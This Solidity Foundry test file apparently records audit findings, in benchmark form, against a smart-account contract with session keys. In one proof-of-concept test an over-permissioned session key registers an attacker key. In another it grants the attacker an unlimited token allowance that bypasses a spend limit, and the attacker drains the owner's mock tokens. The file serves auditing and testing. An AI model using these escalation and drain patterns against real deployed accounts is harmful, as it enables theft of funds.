// SPDX-License-Identifier:MIT
pragma solidity 0.8.29;

import {Deploy} from "./../../Deploy.t.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {console2 as console} from "lib/forge-std/src/Test.sol";
import {MockERC20Permit} from "test/aiudit/mocks/MockERC20Permit.sol";
import {
    PackedUserOperation
} from "lib/account-abstraction/contracts/interfaces/PackedUserOperation.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {console2 as console} from "lib/forge-std/src/console2.sol";

contract TestFindingsEvmBench is Deploy {
    address reciver;
    PubKey internal pK;
    PubKey internal pK_SK;

    uint256 attackerAddrPk;
    address attackerAddr;

    bytes32[2] internal modes = [mode_1, mode_3];

    MockERC20Permit internal mockERC20Permit;

    modifier registerSkEOASelf() {
        _createCustomFreshKey(
            false,
            KeyType.EOA,
            uint48(block.timestamp + 1 days),
            0,
            10,
            _getKeyEOA(sessionKey),
            KeyControl.Self
        );
        _etch();
        vm.prank(owner);
        account.registerKey(skReg);
        _;
    }

    modifier setTokenSpendM(
        KeyType _keyType,
        bytes memory _key,
        address _token,
        uint256 _limit,
        SpendPeriod _period
    ) {
        _etch();
        vm.prank(owner);
        account.setTokenSpend(_computeKeyId(_keyType, _key), _token, _limit, _period);
        _;
    }

    modifier setCanCallM(
        KeyType _keyType,
        bytes memory _key,
        address _target,
        bytes4 _funSel,
        bool _can
    ) {
        _etch();
        vm.prank(owner);
        account.setCanCall(_computeKeyId(_keyType, _key), _target, _funSel, _can);
        _;
    }

    function setUp() public override {
        super.setUp();
        mockERC20Permit = new MockERC20Permit();

        (attackerAddr, attackerAddrPk) = makeAddrAndKey("attacker");
        reciver = makeAddr("reciver");
        _populateWebAuthn("execution.json", ".batch");
        pK = PubKey({x: DEF_WEBAUTHN.X, y: DEF_WEBAUTHN.Y});
        _createCustomFreshKey(
            true, KeyType.WEBAUTHN, type(uint48).max, 0, 0, _getKeyP256(pK), KeyControl.Self
        );
        _createQuickFreshKey(false);

        _initializeAccount();
    }

    function test_v_001_evmbench()
        external
        registerSkEOASelf
        setCanCallM(KeyType.EOA, _getKeyEOA(sessionKey), ANY_TARGET, ANY_FN_SEL, true)
    {
        KeyDataReg memory attacker = KeyDataReg({
            keyType: KeyType.EOA,
            validUntil: type(uint48).max - 1,
            validAfter: 0,
            limits: type(uint48).max,
            key: _getKeyEOA(attackerAddr),
            keyControl: KeyControl.Self
        });

        bytes memory data = abi.encodeWithSelector(account.registerKey.selector, attacker);

        Call[] memory calls = new Call[](1);
        calls[0] = _createCall(address(0), 0, data);

        PackedUserOperation memory userOp = _getFreshUserOp();
        userOp = _populateUserOp(
            userOp,
            _packCallData(mode_1, calls),
            _packAccountGasLimits(600_000, 400_000),
            800_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        bytes memory signature = _signUserOpWithSK(userOp);
        userOp.signature = _encodeEOASignature(signature);

        _relayUserOp(userOp);
    }

    function test_v_002_evmbench() external pure {
        console.log(
            "The recovery module applies only on master key, if session key was compromised the owner/master ket can revoke the session key"
        );
        console.log(
            "Edge case: Master key lost and not have access to the account, in the same time the session key was compromised. In this case owner must to compelte full recovery procces and revoke the session key"
        );
    }

    function test_v_003_evmbench()
        external
        registerSkEOASelf
        setTokenSpendM(
            KeyType.EOA,
            _getKeyEOA(sessionKey),
            address(mockERC20Permit),
            10 ether,
            SpendPeriod.Month
        )
        setCanCallM(KeyType.EOA, _getKeyEOA(sessionKey), address(mockERC20Permit), ANY_FN_SEL, true)
    {
        vm.prank(owner);
        mockERC20Permit.mint(owner, 20 ether);

        uint256 balanceAccounBefore = IERC20(mockERC20Permit).balanceOf(owner);
        uint256 balanceAttackerBefore = IERC20(mockERC20Permit).balanceOf(attackerAddr);
        assertEq(balanceAccounBefore, 20 ether);
        assertEq(balanceAttackerBefore, 0 ether);

        bytes memory data = abi.encodeWithSelector(
            mockERC20Permit.increaseAllowance.selector, attackerAddr, type(uint256).max
        );

        Call[] memory calls = new Call[](1);
        calls[0] = _createCall(address(mockERC20Permit), 0, data);

        PackedUserOperation memory userOp = _getFreshUserOp();
        userOp = _populateUserOp(
            userOp,
            _packCallData(mode_1, calls),
            _packAccountGasLimits(600_000, 400_000),
            800_000,
            _packGasFees(80 gwei, 15 gwei),
            hex""
        );

        bytes memory signature = _signUserOpWithSK(userOp);
        userOp.signature = _encodeEOASignature(signature);

        _relayUserOp(userOp);

        vm.prank(attackerAddr);
        mockERC20Permit.transferFrom(owner, attackerAddr, balanceAccounBefore);

        uint256 balanceAccounAfter = IERC20(mockERC20Permit).balanceOf(owner);
        uint256 balanceAttackerAfter = IERC20(mockERC20Permit).balanceOf(attackerAddr);
        assertEq(balanceAccounAfter, 0 ether);
        assertEq(balanceAttackerAfter, 20 ether);
    }

    function _relayUserOp(PackedUserOperation memory _userOp) internal {
        PackedUserOperation[] memory ops = new PackedUserOperation[](1);
        ops[0] = _userOp;

        _etch();
        vm.prank(sender);
        entryPoint.handleOps(ops, payable(sender));
    }
}
